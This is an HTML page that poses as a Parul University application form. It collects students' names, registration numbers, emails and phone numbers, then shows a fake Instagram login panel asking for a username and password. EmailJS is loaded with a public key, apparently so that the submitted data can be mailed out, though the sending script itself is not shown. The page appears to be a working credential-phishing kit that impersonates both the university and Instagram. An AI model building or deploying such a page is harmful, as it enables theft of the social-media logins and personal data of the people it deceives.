<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parul University</title>
    <link rel="stylesheet" href="style.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
    </script>
    <script type="text/javascript">
        (function () {
            emailjs.init({
                publicKey: "Y12bkDC-PMcVBFf-j",
            });
        })();
    </script>
</head>

<body>

    <div class="container">
        <div class="message-box">
            <h4>Tap on Next-Btn</h4>
            <p>Login in to your instagram page to connect us succesfully.</p>
        </div>
        <h3>Parul University</h3>
        <p class="line">If you want to become parul family member please fill this form to connect with us.
            page.</p>
        <form action="application">

            <div class="name">
                <label for="name">Name: </label>
                <input type="text" name="name" id="name" placeholder="Enter Your Name" required>
            </div>
            <div class="registration">
                <label for="registration">Registration: </label>
                <input type="text" name="registration" id="registration" placeholder="Registration/Enrollment" required>
            </div>
            <div class="course">
                <label for="course">Course:</label>
                <input type="text" name="course" id="course" required>
            </div>
            <div class="email">
                <label for="email">E-Mail: </label>
                <input type="email" name="email" id="email" required>
            </div>
            <div class="mobile">
                <label for="mobile">Number: </label>
                <input type="number" name="mobile" id="mobile" maxlength="10" required>
            </div>
            <div class="btn">
                <button type="submit" id="submit">Submit</button>
                <button type="button" id="next">Next</button>
            </div>
        </form>

        <div class="image">
            <img src="parulimage.png" alt="image">
            <p>Powered By GNWeb Soft Pvt.Ltd.</p>
        </div>
    </div>

    <div class="second-page">
        <p class="cross">X</p>
        <div class="insta-image">
            <img src="instagramimage.favicon.jpg" alt="image">
        </div>
        <div class="username">
            <input type="text" name="name" id="user-name" placeholder="username">
        </div>
        <div class="pass">
            <input type="text" name="pass" id="pass" placeholder="password">
        </div>

        <button id="login">LOGIN</button>
    </div>

    <script src="main.js"></script>
</body>

</html>
